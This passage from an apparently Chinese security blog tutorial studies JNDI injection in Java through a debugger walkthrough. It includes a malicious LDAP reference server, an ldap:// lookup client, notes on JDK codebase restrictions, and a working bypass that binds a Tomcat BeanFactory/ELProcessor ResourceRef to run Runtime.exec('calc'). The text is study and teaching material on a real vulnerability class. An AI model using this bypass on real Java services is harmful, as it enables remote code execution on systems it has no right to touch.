</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">URL</span><span class="w"> </span><span class="n">turl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">.</span><span class="na">getRef</span><span class="p">().</span><span class="na">replace</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;/&#39;</span><span class="p">).</span><span class="na">concat</span><span class="p">(</span><span class="s">&#34;.class&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Send LDAP reference result for &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; redirecting to &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">turl</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;javaClassName&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cbstring</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">refPos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbstring</span><span class="p">.</span><span class="na">indexOf</span><span class="p">(</span><span class="sc">&#39;#&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">refPos</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">cbstring</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbstring</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">refPos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;javaCodeBase&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cbstring</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;objectClass&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;javaNamingReference&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">//$NON-NLS-1$</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;javaFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">.</span><span class="na">getRef</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="p">.</span><span class="na">sendSearchEntry</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="p">.</span><span class="na">setResult</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">LDAPResult</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">ResultCode</span><span class="p">.</span><span class="na">SUCCESS</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>然后再编写一个客户端来请求：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JNDI</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.directory.InitialDirContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">LDAP_Client</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialDirContext</span><span class="p">().</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;ldap://127.0.0.1:8888/Test&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>然后还是使用之前的恶意类，按照之间的操作编译class文件并起一个http服务。</p>
<p>然后启动服务端，再启动客户端就可以成功弹计算机：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112126840.png?imageSlim"
	
	
	
	loading="lazy"
	
	
></p>
<h4 id="代码调试-1">代码调试
</h4><h5 id="ldap_client端">LDAP_Client端
</h5><p>对应代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialDirContext</span><span class="p">().</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;ldap://127.0.0.1:2333/test&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>前面一个InitialDirContext类的初始化也是说过的，大概就是实例化了InitialDirContext类及其父类InitialContext类，并将InitialContext类的myPops赋值为了一个空的Hashtable类。</p>
<p>然后<strong>重点看InitialDirContext类调用的lookup()方法</strong>：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112146334.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011214642287"
	
	
></p>
<p>老朋友了，不多说，第一部分：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112147114.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011214717064"
	
	
></p>
<p>然后调用getURLContext()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112148820.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011214804770"
	
	
></p>
<p>然后调用getURLObject()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112149670.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011214904617"
	
	
></p>
<p>然后获取到ldap服务的工厂类并调用工厂类ldapURLContextFactoy的getObjectInstance()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112150840.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011215009793"
	
	
></p>
<p>然后实例化ldapURLContext类，里面有一个将其父类的父类GenericURLContext类的myEnv变量赋值为空的Hashtable类的操作。</p>
<p>所以第一部分是获取到了ldapURLContext类</p>
<p>——————</p>
<p>所以第二部分会调用ldapURLContext类的lookup()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112158583.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011215856534"
	
	
></p>
<p>会调用到其父类的父类的lookup()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112159518.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011215952468"
	
	
></p>
<p>这里需要注意的是this代表ldapURLContext类，所以会调用ldapURLContext类的getRootURLContext()方法，然后就会调用ldapURLContextFactory类的getUsingURLIgnoreRootDN()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112206890.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011220609839"
	
	
></p>
<p>最后获取到的结果如下：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112207644.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011220737597"
	
	
></p>
<p>后面跟进调用的lookup()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112212422.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011221227371"
	
	
></p>
<p>然后会调用LdapCtx类的p_lookup()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112217321.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011221738263"
	
	
></p>
<p>跟进p_lookup()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112218424.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011221835368"
	
	
></p>
<p><code>var4.getStatus()</code>方法返回2，会匹配2的代码，跟进c_lookup()方法，直接看关键代码：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112238737.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011223844694"
	
	
></p>
<p>这里的var4中存在LDAP的基本信息：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112239438.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011223950395"
	
	
></p>
<p>这里的JAVA_ATTRIBUTES变量就是一个数组：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112245932.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011224505879"
	
	
></p>
<p>所以if条件中获取到了值：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112249011.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011224906966"
	
	
></p>
<p>然后调用了decodeObject()方法，在decodeObject()方法中调用了decodeReference()方法.</p>
<p>在这个decodeReference()方法方法中进行了Reference类的初始化：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112255375.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011225546324"
	
	
></p>
<p>看传入的参数，并且最后返回了这个var5。</p>
<p>回到c_lookup()方法，最后调用了getObjectInstance()方法（这里的var3就是前面的Reference类）：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112259787.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011225927744"
	
	
></p>
<p>跟进方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410112304138.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011230440079"
	
	
></p>
<p>这里的代码是和前面JNDI_RMI的攻击的其中一部分代码都是差不多的，但是还是有点区别：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410121804914.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012180416755"
	
	
></p>
<p>然后会调用getObjectFactoryFromReference()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410121827646.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012182759577"
	
	
></p>
<p>然后会加载类，并且最后会实例化这个类，成功弹计算机：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410121813337.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012181352290"
	
	
></p>
<p>最后还是同样异常输出然后到catch语句。</p>
<h3 id="注意事项">注意事项
</h3><p>JDK版本对JNDI的利用有一定的限制，如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="高版本限制绕过">高版本限制绕过
</h3><p>测试环境：JDK 8u411</p>
<p>——————</p>
<p>限制地点：</p>
<ul>
<li>RMI：</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122029036.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012202928940"
	
	
></p>
<p>这里导致无法继续后面的操作。</p>
<h4 id="利用本地class作为reference-factory">利用本地Class作为Reference Factory
</h4><p>在前面说了，虽然我们不能从远程加载恶意的Factoy，但是我们可以在返回的Reference中指定Factory Class，即我们可以尝试利用本地的类，让本地的类来加载恶意代码。</p>
<p>工厂列必须实现javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法。在这里可以利用org.apache.naming.factory.BeanFactory，完美符合，存在与Tomcat依赖包中，所以可以广泛使用。</p>
<p>在BeanFactory的getObjectInstance()中通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用sette方法为所有的属性赋值。而该Bean Class的类名、属性、属性值全都来自于Reference对象，均是攻击者可控的。</p>
<p>比如JNDI-Ldap就在下代码实例化Reference类：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122101247.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012210150183"
	
	
></p>
<p>也就是如下设置Reference类：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122103231.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012210327181"
	
	
></p>
<p>所以我们现在可以尝试将客户端获取到的Reference类指向可控恶意类。</p>
<p>继续往后面走，只要这里的getObjectFactoryFromReference类成功实例化指向类，而不像之前那样弹出计算机导致异常输出，这里就有机会调用到这个指向类的getObjectInstance()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122125736.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012212528683"
	
	
></p>
<p>——————</p>
<p>JNDI-RMI过程中获取Reference类是直接从数据流中读取的，可以自己跟跟，不赘述了，然后调用到指定类的getObjectInstance()方法是差不多的。</p>
<p>现在在pom.xml中引入这个存在BeanFactoy类的依赖来本地测试：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>tomcat-catalina<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>8.5.20<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="代码实现及分析">代码实现及分析
</h5><p>直接给代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JNDI</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.naming.ResourceRef</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.StringRefAddr</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JNDI_RMI_Server_ByPass</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ResourceRef</span><span class="w"> </span><span class="n">resourceRef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ResourceRef</span><span class="p">(</span><span class="s">&#34;javax.el.ELProcessor&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.naming.factory.BeanFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">resourceRef</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringRefAddr</span><span class="p">(</span><span class="s">&#34;forceString&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;faster=eval&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">resourceRef</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringRefAddr</span><span class="p">(</span><span class="s">&#34;faster&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Runtime.getRuntime().exec(\&#34;calc\&#34;)&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReferenceWrapper</span><span class="w"> </span><span class="n">referenceWrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ReferenceWrapper</span><span class="p">(</span><span class="n">resourceRef</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">registry</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;Hello&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">referenceWrapper</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Registry运行中......&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>然后现在就只需要先运行这个Server端，再运行客户端来请求即可。</p>
<p><strong>注意</strong>：这是根据BeanFactory的代码逻辑，要求传入的Reference为ResourceRef类，并不是前面的Reference类。</p>
<p>所以当调用到decodeObject()方法时，方法中获取到的是ResourceRef类：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122204546.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012220437476"
	
	
></p>
<p>即这里的var3的值：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122206205.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012220612152"
	
	
></p>
<p>然后会调用NamingManager类的getObjectInstance()方法，直接到关键地方：
这个方法内会调用getObjectFactoryFromReference()方法，会加载并实例化BeanFactory类：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122212029.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012221208969"
	
	
></p>
<p>return后就会调用到这个BeanFactory类的getObjectInstance()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122213064.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012221312011"
	
	
></p>
<p>传入参数的参数简单说说：1.前面获取的ResourceRef类，2.Hello，3.RegistryContext类，4.空的Hashtabel类</p>
<p>给下RegistryContext类的值的情况：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122217694.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012221738640"
	
	
></p>
<p>前面的分析中经常说这个类的创建，参数传递而已，不多说。</p>
<p>现在来跟进BeanFactory类的getObjectInstance()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122225244.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012222507178"
	
	
></p>
<p>可以看到进入这个if语句的条件就是需要obj为ResouceRef类或其子类，这也就是为什么要传那个类。</p>
<p>看try语句，前三个不多说，获取的值情况：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122231426.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012223113364"
	
	
></p>
<p>然后进入第二个if条件，就会尝试加载javax.el.ELProcessor类，会成功加载到Class对象。继续往后看：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122233090.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012223354026"
	
	
></p>
<p>会进入else语句，但是后面会报错，需要又引入一个依赖，如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.apache.el<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>com.springsource.org.apache.el<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>6.0.24<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>继续看，</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122300330.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012230031257"
	
	
></p>
<p>可以看到将其放进了HashMap类中在后续代码中又将其取出利用;</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410122301654.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241012230155602"
	
	
></p>
<p>并直接调用：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410131542788.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241013154232572"
	
	
></p>
<p>即现在就会调用到calc</p>
<h4 id="利用ldap返回序列化数据反序触发本地gadget">利用LDAP返回序列化数据，反序触发本地Gadget
</h4><p>同样是利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget。</p>
<p>服务端代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
